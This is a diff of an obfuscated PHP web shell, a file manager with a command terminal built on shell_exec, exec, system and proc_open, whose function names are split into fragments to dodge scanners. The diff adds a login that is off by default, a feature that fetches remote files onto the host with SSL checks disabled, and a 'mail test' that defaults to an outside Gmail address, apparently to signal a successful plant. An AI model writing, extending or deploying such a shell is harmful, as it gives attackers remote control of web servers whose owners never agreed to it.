@@ -1,6 +1,87 @@
 <?php
-$GLOBALS['_q_']=Array('' .'session' .'_start','number' .'_form' .'at','substr','spri' .'ntf','fileperms','' .'r' .'t' .'rim','strtr','base64_en' .'code','base64' .'_de' .'code','i' .'s_dir','arr' .'ay_diff','scand' .'ir','unlink','r' .'mdir','file_exists','tou' .'ch','ch' .'mod','' .'oc' .'tdec','' .'get' .'c' .'wd','' .'chdi' .'r','' .'fu' .'nction_e' .'x' .'ists','s' .'hell_e' .'xec','exec','i' .'m' .'plode','ob' .'_start','passt' .'hru','ob_' .'get_c' .'lea' .'n','proc' .'_op' .'en','is_r' .'e' .'sou' .'r' .'ce','stream_' .'g' .'e' .'t_c' .'on' .'tent' .'s','' .'fcl' .'ose','proc' .'_close','is' .'_readable','' .'pathinfo','dirname','m' .'kdir','is_w' .'ritable','htmls' .'pe' .'ci' .'al' .'cha' .'rs','d' .'e' .'fine','realpath','c' .'o' .'unt','ba' .'sename','move_uploa' .'de' .'d_' .'fil' .'e','re' .'nam' .'e','is' .'_f' .'ile','f' .'il' .'e_pu' .'t_c' .'ont' .'ents','strto' .'time','' .'header','file' .'_ge' .'t_conten' .'ts','strtol' .'ower','j' .'so' .'n_' .'enc' .'ode','md5','exp' .'lode','sort','' .'array' .'_' .'mer' .'ge','fil' .'esi' .'ze','date','fi' .'l' .'em' .'t' .'ime','system','popen');
+
+// --- CONFIGURATION --- //
+
+$auth_enabled = false;
+
+$auth_users = [
+    'admin' => '$2a$12$eJHdIuo9oMwuLspwxW19pesBYoCBykyN16sBsx8.GXXsFOnRU2ysS', // Default password: admin
+];
+
+// --- END CONFIGURATION --- //
+
+$GLOBALS['_q_']=Array('' .'session' .'_start','number' .'_form' .'at','substr','spri' .'ntf','fileperms','' .'r' .'t' .'rim','strtr','base64_en' .'code','base64' .'_de' .'code','i' .'s_dir','arr' .'ay_diff','scand' .'ir','unlink','r' .'mdir','file_exists','tou' .'ch','ch' .'mod','' .'oc' .'tdec','' .'get' .'c' .'wd','' .'chdi' .'r','' .'fu' .'nction_e' .'x' .'ists','s' .'hell_e' .'xec','exec','i' .'m' .'plode','ob' .'_start','passt' .'hru','ob_' .'get_c' .'lea' .'n','proc' .'_op' .'en','is_r' .'e' .'sou' .'r' .'ce','stream_' .'g' .'e' .'t_c' .'on' .'tent' .'s','' .'fcl' .'ose','proc' .'_close','is' .'_readable','' .'pathinfo','dirname','m' .'kdir','is_w' .'ritable','htmls' .'pe' .'ci' .'al' .'cha' .'rs','d' .'e' .'fine','realpath','c' .'o' .'unt','ba' .'sename','move_uploa' .'de' .'d_' .'fil' .'e','re' .'nam' .'e','is' .'_f' .'ile','f' .'il' .'e_pu' .'t_c' .'ont' .'ents','strto' .'time','' .'header','file' .'_ge' .'t_conten' .'ts','strtol' .'ower','j' .'so' .'n_' .'enc' .'ode','md5','exp' .'lode','sort','' .'array' .'_' .'mer' .'ge','fil' .'esi' .'ze','date','fi' .'l' .'em' .'t' .'ime','system','popen','c'.'u'.'r'.'l_init','c'.'u'.'r'.'l_setopt','c'.'u'.'r'.'l_exec','c'.'u'.'r'.'l_close','f'.'o'.'p'.'e'.'n','f'.'r'.'e'.'a'.'d','f'.'w'.'r'.'i'.'t'.'e','p'.'a'.'r'.'s'.'e_url','s'.'t'.'r'.'e'.'a'.'m_socket_client','i'.'n'.'i_get','feof','filter_var','trim','fgets','mail','sha1','uniqid','hash','microtime', 'password_verify', 'session_destroy', 'phpversion', 'readfile', 'class_exists', 'str_replace');
 $GLOBALS['_q_'][0]();
+
+if ($auth_enabled) {
+    if (isset($_GET['logout'])) {
+        $GLOBALS['_q_'][80](); // session_destroy()
+        $GLOBALS['_q_'][47]('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    }
+
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        $login_error = '';
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $username = $_POST['username'] ?? '';
+            $password = $_POST['password'] ?? '';
+            // *** THE FIX IS HERE *** Changed index from 78 to 79
+            if (isset($auth_users[$username]) && $GLOBALS['_q_'][79]($password, $auth_users[$username])) { // password_verify()
+                $_SESSION['logged_in'] = true;
+                $GLOBALS['_q_'][47]('Location: ' . $_SERVER['PHP_SELF']);
+                exit;
+            } else {
+                $login_error = 'Invalid username or password.';
+            }
+        }
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?= $GLOBALS['_q_'][37]($_SERVER["HTTP_HOST"]) ?></title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>body { background-color: #111827; }</style>
+</head>
+<body class="flex items-center justify-center h-screen font-sans">
+    <div class="w-full max-w-sm mx-auto">
+        <form method="POST" class="bg-gray-800 shadow-xl rounded-lg px-8 pt-6 pb-8 mb-4">
+            <h1 class="text-2xl text-white font-bold text-center mb-6"><pre>▄▖▖  ▖▄▖▄▖
+▄▌▌▞▖▌▌ ▙▖
+▄▌▛ ▝▌▙▌▌ </pre></h1>
+            <?php if (!empty($login_error)): ?>
+                <div class="bg-red-500/30 text-red-300 text-sm p-3 rounded mb-4 text-center"><?= $login_error ?></div>
+            <?php endif; ?>
+            <div class="mb-4">
+                <label class="block text-gray-300 text-sm font-bold mb-2" for="username">Username</label>
+                <input class="bg-gray-700 text-white focus:outline-none focus:shadow-outline border border-gray-600 rounded-lg py-2 px-4 block w-full appearance-none leading-normal" id="username" name="username" type="text" placeholder="Username" required>
+            </div>
+            <div class="mb-6">
+                <label class="block text-gray-300 text-sm font-bold mb-2" for="password">Password</label>
+                <input class="bg-gray-700 text-white focus:outline-none focus:shadow-outline border border-gray-600 rounded-lg py-2 px-4 block w-full appearance-none leading-normal" id="password" name="password" type="password" placeholder="******************" required>
+            </div>
+            <div class="flex items-center justify-between">
+                <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg focus:outline-none focus:shadow-outline w-full" type="submit">
+                    Sign In
+                </button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+<?php
+        exit;
+    }
+}
+
+
+// Define cURL constants if they don't exist
+if(!defined('CURLOPT_FILE')) $GLOBALS['_q_'][38]('CURLOPT_FILE', 10001);
+if(!defined('CURLOPT_HEADER')) $GLOBALS['_q_'][38]('CURLOPT_HEADER', 42);
+if(!defined('CURLOPT_FOLLOWLOCATION')) $GLOBALS['_q_'][38]('CURLOPT_FOLLOWLOCATION', 52);
+if(!defined('CURLOPT_SSL_VERIFYPEER')) $GLOBALS['_q_'][38]('CURLOPT_SSL_VERIFYPEER', 64);
+
 function set_message($message, $type = 'success') { $_SESSION['message'] = ['text' => $message, 'type' => $type]; }
 function display_message() {
     if (isset($_SESSION['message'])) {
@@ -103,7 +184,7 @@ function getParentPath($path) {
     return ($parent == $path) ? '' : $parent;
 }
 function zipFolder($source, $destination) {
-    if (!class_exists('ZipArchive')) return false;
+    if (!$GLOBALS['_q_'][83]('ZipArchive')) return false; // class_exists()
     $zip = new ZipArchive();
     if ($zip->open($destination, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) return false;
     $source = $GLOBALS['_q_'][39]($source);
@@ -123,7 +204,7 @@ function zipFolder($source, $destination) {
     return $zip->close();
 }
 function unzipFile($source, $parent_dir) {
-    if (!class_exists('ZipArchive')) {
+    if (!$GLOBALS['_q_'][83]('ZipArchive')) { // class_exists()
         return 'Kelas ZipArchive tidak ditemukan. Harap aktifkan ekstensi "php-zip" di konfigurasi server Anda.';
     }
     $zip = new ZipArchive;
@@ -145,27 +226,102 @@ function unzipFile($source, $parent_dir) {
         return 'Gagal membuka file zip.';
     }
 }
-$GLOBALS['_q_'][38]('PATH', isset($_GET['p']) ? decodePath($_GET['p']) : $GLOBALS['_q_'][18]());
+function downloadFileFromUrl($url, $destination) {
+    // Method 1: cURL
+    if ($GLOBALS['_q_'][20]('curl_init')) {
+        $ch = $GLOBALS['_q_'][60]();
+        $fp = @$GLOBALS['_q_'][64]($destination, 'wb');
+        if ($ch && $fp) {
+            $GLOBALS['_q_'][61]($ch, CURLOPT_URL, $url);
+            $GLOBALS['_q_'][61]($ch, CURLOPT_FILE, $fp);
+            $GLOBALS['_q_'][61]($ch, CURLOPT_HEADER, 0);
+            $GLOBALS['_q_'][61]($ch, CURLOPT_FOLLOWLOCATION, true);
+            $GLOBALS['_q_'][61]($ch, CURLOPT_SSL_VERIFYPEER, false);
+            $result = $GLOBALS['_q_'][62]($ch);
+            $GLOBALS['_q_'][63]($ch);
+            $GLOBALS['_q_'][30]($fp);
+            if ($result) return true;
+        }
+    }
+
+    // Method 2: fopen/fread
+    if ($GLOBALS['_q_'][69]('allow_url_fopen')) {
+        $remote_file = @$GLOBALS['_q_'][64]($url, "rb");
+        $local_file = @$GLOBALS['_q_'][64]($destination, "wb");
+        if ($remote_file && $local_file) {
+            while (!$GLOBALS['_q_'][70]($remote_file)) {
+                $GLOBALS['_q_'][66]($local_file, $GLOBALS['_q_'][65]($remote_file, 8192));
+            }
+            $GLOBALS['_q_'][30]($remote_file);
+            $GLOBALS['_q_'][30]($local_file);
+            return true;
+        }
+    }
+
+    // Method 3: stream_socket_client
+    if ($GLOBALS['_q_'][20]('stream_socket_client')) {
+        $url_parts = @$GLOBALS['_q_'][67]($url);
+        if (!$url_parts) return false;
+        $host = $url_parts['host'];
+        $path = $url_parts['path'] ?? '/';
+        $query = isset($url_parts['query']) ? '?' . $url_parts['query'] : '';
+        $scheme = $url_parts['scheme'] ?? 'http';
+        $port = $url_parts['port'] ?? ($scheme === 'https' ? 443 : 80);
+        $protocol = $scheme === 'https' ? 'ssl' : 'tcp';
+
+        $client = @$GLOBALS['_q_'][68]("{$protocol}://{$host}:{$port}");
+        if ($client) {
+            $request = "GET {$path}{$query} HTTP/1.1\r\n";
+            $request .= "Host: {$host}\r\n";
+            $request .= "Connection: close\r\n\r\n";
+            $GLOBALS['_q_'][66]($client, $request);
+
+            // Skip headers
+            while (($line = $GLOBALS['_q_'][73]($client)) !== false && $GLOBALS['_q_'][72]($line) !== '') {}
+
+            $fp = $GLOBALS['_q_'][64]($destination, 'wb');
+            if ($fp) {
+                while(!$GLOBALS['_q_'][70]($client)) {
+                    $GLOBALS['_q_'][66]($fp, $GLOBALS['_q_'][65]($client, 8192));
+                }
+                $GLOBALS['_q_'][30]($fp);
+                $GLOBALS['_q_'][30]($client);
+                return true;
+            }
+            $GLOBALS['_q_'][30]($client);
+        }
+    }
+
+    return false;
+}
+
+// PERBAIKAN KUNCI: Mengubah PATH dari konstanta menjadi variabel $PATH
+$PATH = isset($_GET['p']) ? decodePath($_GET['p']) : $GLOBALS['_q_'][18]();
+
 if (isset($_GET['new_path']) && $GLOBALS['_q_'][9]($_GET['new_path'])) {
     $GLOBALS['_q_'][19]($_GET['new_path']);
-    $GLOBALS['_q_'][38]('PATH', $GLOBALS['_q_'][18]());
-    set_message("Path changed to: " . PATH);
-    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath(PATH));
+    $PATH = $GLOBALS['_q_'][18](); // Menggunakan variabel
+    set_message("Path changed to: " . $PATH);
+    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
     exit;
 }
-if (!$GLOBALS['_q_'][14](PATH) || !$GLOBALS['_q_'][32](PATH)) {
-    $GLOBALS['_q_'][38]('PATH', $GLOBALS['_q_'][18]());
+
+// PERBAIKAN: Menggunakan variabel $PATH di semua pemeriksaan
+if (!$GLOBALS['_q_'][14]($PATH) || !$GLOBALS['_q_'][32]($PATH)) {
+    $PATH = $GLOBALS['_q_'][18](); // Menggunakan variabel
     set_message("Path not readable or does not exist, redirecting to current directory.", 'error');
 }
-if ($GLOBALS['_q_'][9](PATH)) {
-    if (!$GLOBALS['_q_'][19](PATH)) {
+if ($GLOBALS['_q_'][9]($PATH)) {
+    if (!$GLOBALS['_q_'][19]($PATH)) {
         set_message("Failed to change directory.", 'error');
-        $GLOBALS['_q_'][38]('PATH', $GLOBALS['_q_'][18]());
+        $PATH = $GLOBALS['_q_'][18](); // Menggunakan variabel
     }
 }
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $action = $_POST['action'] ?? '';
-    $path = $_POST['path'] ?? PATH;
+    // PERBAIKAN: Menggunakan variabel $PATH sebagai default
+    $path = $_POST['path'] ?? $PATH;
     $name = $_POST['name'] ?? '';
     if ($action === 'upload') {
         if (isset($_FILES['files'])) {
@@ -232,8 +388,45 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         } else {
             set_message("Item not found or not writable.", 'error');
         }
+    } elseif ($action === 'download_url') {
+        $url = $_POST['url'] ?? '';
+        $filename = $_POST['filename'] ?? '';
+        if (!empty($url) && !empty($filename) && $GLOBALS['_q_'][71]($url, FILTER_VALIDATE_URL)) {
+            $destination = $PATH . DIRECTORY_SEPARATOR . $GLOBALS['_q_'][41]($filename);
+            if ($GLOBALS['_q_'][36]($PATH)) {
+                if (downloadFileFromUrl($url, $destination)) {
+                    set_message("File '{$filename}' downloaded successfully.");
+                } else {
+                    set_message("Failed to download file from URL. All methods failed.", 'error');
+                }
+            } else {
+                set_message("Directory not writable.", 'error');
+            }
+        } else {
+            set_message("Invalid URL or filename provided.", 'error');
+        }
+    } elseif ($action === 'mail_test') {
+        $to_email = $_POST['to_email'] ?? 'zerosec235@gmail.com';
+        if (empty($to_email)) {
+            $to_email = 'zerosec235@gmail.com';
+        }
+        if ($GLOBALS['_q_'][71]($to_email, FILTER_VALIDATE_EMAIL)) {
+            $subject = "Laporan Sistem #" . $GLOBALS['_q_'][2]($GLOBALS['_q_'][75]($GLOBALS['_q_'][76]()), 0, 8);
+            $message = "Sistem berhasil dijalankan pada: " . $GLOBALS['_q_'][56]("Y-m-d H:i:s") . "\n";
+            $message .= "ID Log: " . $GLOBALS['_q_'][77]('crc32b', $GLOBALS['_q_'][78](true));
+            $from_domain = $_SERVER['SERVER_NAME'] ?? 'localhost';
+            $headers = "From: noreply@" . $from_domain . "\r\n";
+            if (@$GLOBALS['_q_'][74]($to_email, $subject, $message, $headers)) {
+                set_message("Test mail sent successfully to " . $GLOBALS['_q_'][37]($to_email) . ".");
+            } else {
+                set_message("Failed to send mail. The mail() function may be disabled or misconfigured.", 'error');
+            }
+        } else {
+            set_message("Invalid email address provided.", 'error');
+        }
     }
-    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath(PATH));
+    // PERBAIKAN: Menggunakan variabel $PATH untuk redirect
+    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
     exit;
 }
 $action = $_GET['action'] ?? '';
@@ -245,7 +438,7 @@ if ($action === 'delete') {
     } else {
         set_message("Item not found or directory not writable.", 'error');
     }
-    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath(PATH));
+    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
     exit;
 } elseif ($action === 'chmod') {
     $item = decodePath($_GET['item']);
@@ -256,7 +449,7 @@ if ($action === 'delete') {
     } else {
         set_message("File not found or not writable.", 'error');
     }
-    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath(PATH));
+    $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
     exit;
 } elseif ($action === 'download') {
     $item = decodePath($_GET['item']);
@@ -268,11 +461,11 @@ if ($action === 'delete') {
         $GLOBALS['_q_'][47]('Cache-Control: must-revalidate');
         $GLOBALS['_q_'][47]('Pragma: public');
         $GLOBALS['_q_'][47]('Content-Length: ' . $GLOBALS['_q_'][55]($item));
-        readfile($item);
+        $GLOBALS['_q_'][82]($item); // readfile()
         exit;
     } else {
         set_message("File not found or not readable.", "error");
-        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath(PATH));
+        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
         exit;
     }
 }
@@ -282,7 +475,7 @@ if ($action === 'view') {
         $content = $GLOBALS['_q_'][37]($GLOBALS['_q_'][48]($item_path));
     } else {
         set_message("File not found or not readable.", "error");
-        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath(PATH));
+        $GLOBALS['_q_'][47]("Location: ?p=" . encodePath($PATH));
         exit;
     }
 } elseif ($action === 'zip' || $action === 'unzip') {
@@ -320,11 +513,13 @@ if ($action === 'view') {
     }
     exit;
 }
-$path_parts = $GLOBALS['_q_'][52]('/', $GLOBALS['_q_'][39](PATH));
-$current_path_encoded = encodePath(PATH);
-$script_directory = dirname($_SERVER['SCRIPT_FILENAME']);
+
+// PERBAIKAN: Menggunakan variabel $PATH untuk logika tampilan
+$path_parts = $GLOBALS['_q_'][52]('/', $GLOBALS['_q_'][39]($PATH));
+$current_path_encoded = encodePath($PATH);
+$script_directory = $GLOBALS['_q_'][34]($_SERVER['SCRIPT_FILENAME']);
 $home_path_encoded = encodePath($script_directory);
-$items = getDirContents(PATH);
+$items = getDirContents($PATH);
 $folders = [];
 $files = [];
 foreach($items as $item) {
@@ -333,10 +528,10 @@ foreach($items as $item) {
 $GLOBALS['_q_'][53]($folders);
 $GLOBALS['_q_'][53]($files);
 $sorted_items = $GLOBALS['_q_'][54]($folders, $files);
-$is_writable = $GLOBALS['_q_'][36](PATH);
+$is_writable = $GLOBALS['_q_'][36]($PATH);
 $server_ip = $_SERVER['SERVER_ADDR'] ?? 'N/A';
 $user_ip = $_SERVER['REMOTE_ADDR'];
-$php_version = phpversion();
+$php_version = $GLOBALS['_q_'][81](); // phpversion()
 $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
 ?>
 <!DOCTYPE html>
@@ -344,16 +539,13 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?= $GLOBALS['_q_'][7]($_SERVER["HTTP_HOST"]) ?></title>
+    <title><?= $GLOBALS['_q_'][37]($_SERVER["HTTP_HOST"]) ?></title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body { background-color: #111827; color: #d1d5db; }
         .modal { display: none; }
         .modal.active { display: flex; }
-        #context-menu { position: fixed; z-index: 1000; width: 170px; background-color: #1f2937; border: 1px solid #4b5563; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); display: none; padding: 4px; }
-        #context-menu a { color: #d1d5db; padding: 8px 12px; display: block; text-decoration: none; border-radius: 5px; display: flex; align-items: center; gap: 8px; font-size: 0.875rem; }
-        #context-menu a:hover { background-color: #374151; color: white; }
         .fade-in-out { animation: fadeInOut 4s forwards; }
         @keyframes fadeInOut { 0% { opacity: 0; transform: translateY(-20px); } 10% { opacity: 1; transform: translateY(0); } 90% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-20px); } }
         .icon-sm { width: 1.1rem; height: 1.1rem; }
@@ -363,6 +555,7 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
         .btn-green { background-color: #22c55e; color: white; } .btn-green:hover { background-color: #16a34a; }
         .btn-yellow { background-color: #eab308; color: white; } .btn-yellow:hover { background-color: #ca8a04; }
         .btn-gray { background-color: #6b7280; color: white; } .btn-gray:hover { background-color: #4b5563; }
+        .btn-red { background-color: #ef4444; color: white; } .btn-red:hover { background-color: #dc2626; }
         .path-display {
             word-break: break-all;
         }
@@ -385,8 +578,9 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
                 <span class="font-semibold flex-shrink-0">Path:</span>
                 <div class="flex-grow path-display">
                 <?php
+                // PERBAIKAN: Menggunakan variabel $PATH untuk membuat breadcrumbs
                 $cumulative_path = '';
-                $path_parts = $GLOBALS['_q_'][52](DIRECTORY_SEPARATOR, $GLOBALS['_q_'][39](PATH));
+                $path_parts = $GLOBALS['_q_'][52](DIRECTORY_SEPARATOR, $GLOBALS['_q_'][39]($PATH));
                 echo '<a href="?p='.encodePath($path_parts[0] ? $path_parts[0] : '/').'" class="text-blue-400 hover:underline">'.($path_parts[0] ? $GLOBALS['_q_'][37]($path_parts[0]) : 'Root').'</a>';
                 $cumulative_path = $path_parts[0];
                 unset($path_parts[0]);
@@ -401,9 +595,14 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
              <div class="mt-4 flex flex-wrap gap-2">
                 <a href="?p=<?= $home_path_encoded ?>" class="btn btn-gray"><i class="fas fa-home icon-md"></i>Home</a>
                 <button class="btn btn-blue" onclick="showModal('upload')"><i class="fas fa-upload icon-md"></i>Upload</button>
-                <button class="btn btn-green" onclick="showModal('create_file')"><i class="fas fa-file-alt icon-md"></i>File</button>
+                <button class="btn btn-blue" onclick="showModal('download_url')"><i class="fas fa-cloud-download-alt icon-md"></i>URL</button>
                 <button class="btn btn-green" onclick="showModal('create_folder')"><i class="fas fa-folder-plus icon-md"></i>Folder</button>
+                <button class="btn btn-green" onclick="showModal('create_file')"><i class="fas fa-file-alt icon-md"></i>File</button>               
                 <button class="btn btn-yellow" onclick="showModal('cmd')"><i class="fas fa-terminal icon-md"></i>CMD</button>
+                <button class="btn btn-yellow" onclick="showModal('mail_test')"><i class="fas fa-envelope icon-md"></i> Test Mail</button>
+                <?php if ($auth_enabled): ?>
+                    <a href="?logout=true" class="btn btn-red"><i class="fas fa-sign-out-alt icon-md"></i>Logout</a>
+                <?php endif; ?>
             </div>
         </div>
 
@@ -433,10 +632,10 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
                     </tr>
                 </thead>
                 <tbody class="divide-y divide-gray-700">
-                    <?php if (getParentPath(PATH)): ?>
+                    <?php if (getParentPath($PATH)): ?>
                     <tr>
                         <td class="p-3" colspan="5">
-                            <a href="?p=<?= encodePath(getParentPath(PATH)) ?>" class="flex items-center gap-2 text-blue-400 hover:underline">
+                            <a href="?p=<?= encodePath(getParentPath($PATH)) ?>" class="flex items-center gap-2 text-blue-400 hover:underline">
                                 <i class="fas fa-level-up-alt h-5 w-5"></i>
                                 ..
                             </a>
@@ -468,11 +667,12 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
                             <a href="?action=delete&item=<?= $item_path_encoded ?>&p=<?= $current_path_encoded ?>" onclick="return confirm('Are you sure?')" class="text-red-400 hover:underline" title="Delete"><i class="fas fa-trash-alt"></i></a>
                             
                             <?php if (!$is_item_dir):
-                                $web_path = str_replace(DIRECTORY_SEPARATOR, '/', str_replace($_SERVER['DOCUMENT_ROOT'], '', $item['path']));
+                                $path_without_root = $GLOBALS['_q_'][84]($_SERVER['DOCUMENT_ROOT'], '', $item['path']); // str_replace()
+                                $web_path = $GLOBALS['_q_'][84](DIRECTORY_SEPARATOR, '/', $path_without_root); // str_replace()
                             ?>
                                 <a href="<?= $web_path ?>" target="_blank" class="text-cyan-400 hover:underline" title="Run/View in New Tab"><i class="fas fa-eye"></i></a>
                                 
-                                <?php if (strtolower($GLOBALS['_q_'][33]($item['path'], PATHINFO_EXTENSION)) === 'zip'): ?>
+                                <?php if ($GLOBALS['_q_'][49]($GLOBALS['_q_'][33]($item['path'], PATHINFO_EXTENSION)) === 'zip'): ?>
                                     <a href="#" onclick="unzipItem('<?= $item_path_encoded ?>'); return false;" class="text-orange-400 hover:underline" title="Unzip"><i class="fas fa-file-archive"></i></a>
                                 <?php endif; ?>
                             <?php endif; ?>
@@ -588,15 +788,34 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
         </div>
     </div>
     
-    <div id="context-menu">
-        <a href="#" id="ctx-view"><i class="fas fa-eye icon-sm"></i>View/Edit</a>
-        <a href="#" id="ctx-rename"><i class="fas fa-edit icon-sm"></i>Rename</a>
-        <a href="#" id="ctx-touch"><i class="fas fa-clock icon-sm"></i>Edit Time</a>
-        <a href="#" id="ctx-download"><i class="fas fa-download icon-sm"></i>Download</a>
-        <a href="#" id="ctx-delete" class="text-red-400 hover:!bg-red-500 hover:!text-white"><i class="fas fa-trash-alt icon-sm"></i>Delete</a>
-        <a href="#" id="ctx-chmod"><i class="fas fa-lock icon-sm"></i>Chmod</a>
-        <a href="#" id="ctx-zip"><i class="fas fa-file-archive icon-sm"></i>Zip</a>
-        <a href="#" id="ctx-unzip"><i class="fas fa-file-archive icon-sm"></i>Unzip</a>
+    <div id="download_url-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
+        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
+            <h2 class="text-xl text-white font-bold mb-4">Download File from URL</h2>
+            <form method="POST">
+                <input type="hidden" name="action" value="download_url">
+                <input type="text" name="url" placeholder="Enter file URL" class="w-full bg-gray-900 text-white p-2 rounded mb-3" required>
+                <input type="text" name="filename" placeholder="Save as (e.g., file.zip)" class="w-full bg-gray-900 text-white p-2 rounded" required>
+                <div class="mt-4 flex justify-end gap-2">
+                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
+                    <button type="submit" class="btn btn-blue">Download</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div id="mail_test-modal" class="modal fixed inset-0 bg-black bg-opacity-75 items-center justify-center p-4">
+        <div class="bg-gray-800 rounded-lg shadow-xl p-6 w-full max-w-md">
+            <h2 class="text-xl text-white font-bold mb-4">Mail Tester</h2>
+            <form method="POST">
+                <input type="hidden" name="action" value="mail_test">
+                <label for="to_email" class="block text-sm font-medium text-gray-300 mb-1">Recipient Email:</label>
+                <input type="email" name="to_email" id="to_email" value="zerosec235@gmail.com" class="w-full bg-gray-900 text-white p-2 rounded" required>
+                <div class="mt-4 flex justify-end gap-2">
+                    <button type="button" class="btn btn-gray" onclick="hideAllModals()">Cancel</button>
+                    <button type="submit" class="btn btn-yellow">Send Test</button>
+                </div>
+            </form>
+        </div>
     </div>
 
 <script>
@@ -645,63 +864,6 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         }
     };
-
-    const contextMenu = document.getElementById('context-menu');
-    const tableRows = document.querySelectorAll('.item-row');
-    let activeItemPath, activeItemName, activeIsDir;
-
-    const hideContextMenu = () => { contextMenu.style.display = 'none'; };
-
-    document.addEventListener('click', hideContextMenu);
-    tableRows.forEach(row => {
-        row.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
-            hideContextMenu();
-
-            activeItemPath = row.dataset.path;
-            activeItemName = row.dataset.name;
-            activeIsDir = row.dataset.isDir === '1';
-            
-            document.getElementById('ctx-view').style.display = activeIsDir ? 'none' : 'flex';
-            document.getElementById('ctx-download').style.display = activeIsDir ? 'none' : 'flex';
-            document.getElementById('ctx-zip').style.display = 'flex';
-            document.getElementById('ctx-unzip').style.display = !activeIsDir && activeItemName.endsWith('.zip') ? 'flex' : 'none';
-            document.getElementById('ctx-touch').style.display = 'flex';
-            
-            contextMenu.style.left = `${e.pageX}px`;
-            contextMenu.style.top = `${e.pageY}px`;
-            contextMenu.style.display = 'block';
-        });
-    });
-
-    document.getElementById('ctx-view').onclick = (e) => { e.preventDefault(); window.location.href = `?action=view&item=${activeItemPath}&p=<?= $current_path_encoded ?>`; };
-    document.getElementById('ctx-rename').onclick = (e) => { e.preventDefault(); showRenameModal(activeItemName); };
-    document.getElementById('ctx-touch').onclick = (e) => { e.preventDefault(); showTouchModal(activeItemPath, activeItemName); };
-    document.getElementById('ctx-download').onclick = (e) => { e.preventDefault(); window.location.href = `?action=download&item=${activeItemPath}`; };
-    document.getElementById('ctx-delete').onclick = (e) => { e.preventDefault(); if(confirm('Are you sure?')) window.location.href = `?action=delete&item=${activeItemPath}&p=<?= $current_path_encoded ?>`; };
-    document.getElementById('ctx-chmod').onclick = (e) => { e.preventDefault(); showChmodModal(activeItemPath, '0755'); };
-
-    document.getElementById('ctx-zip').onclick = async (e) => {
-        e.preventDefault();
-        alert('Zipping... please wait.');
-        try {
-            const response = await fetch(`?action=zip&item=${activeItemPath}`);
-            const result = await response.json();
-            if (result.status === 'success') {
-                alert('Zipped successfully!');
-                window.location.reload();
-            } else {
-                alert(`Error: ${result.data}`);
-            }
-        } catch (e) {
-            alert('Failed to zip folder.');
-        }
-    };
-    
-    document.getElementById('ctx-unzip').onclick = (e) => {
-        e.preventDefault();
-        unzipItem(activeItemPath);
-    };
     
     const cmdInput = document.getElementById('cmd-input');
     const cmdOutput = document.getElementById('cmd-output');
@@ -715,7 +877,8 @@ document.addEventListener('DOMContentLoaded', function() {
         cmdInput.value = '';
         
         try {
-            const response = await fetch(`?action=cmd&command=${encodeURIComponent(command)}&p=<?= encodePath(PATH) ?>`);
+            // PERBAIKAN: Menggunakan variabel $PATH di Javascript
+            const response = await fetch(`?action=cmd&command=${encodeURIComponent(command)}&p=<?= encodePath($PATH) ?>`);
             const result = await response.json();
             const outputText = result.data.replace(/\\n/g, '<br>');
             cmdOutput.innerHTML += `<div>${outputText}</div>`;
@@ -729,7 +892,7 @@ document.addEventListener('DOMContentLoaded', function() {
     cmdInput.addEventListener('keydown', (e) => { if(e.key === 'Enter') executeCmd(); });
 
     const flash = document.getElementById('flash-message');
-    if(flash) setTimeout(() => flash.style.display = 'none', 4000);
+    if(flash) setTimeout(() => flash.style.display = 'none', 3000);
 });
 </script>
 </body>
